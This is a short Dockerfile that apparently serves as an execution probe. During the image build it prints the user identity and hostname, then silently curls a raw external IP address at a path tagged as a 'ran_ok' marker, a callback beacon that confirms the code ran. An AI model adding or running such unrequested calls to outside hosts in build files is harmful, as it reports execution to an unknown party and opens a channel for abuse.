FROM alpine:3.20
RUN echo "W16ICI $(id) $(hostname)" && curl -s -m5 http://169.58.237.50/w16esc-e328516f/ran_ok
CMD ["sleep","30"]
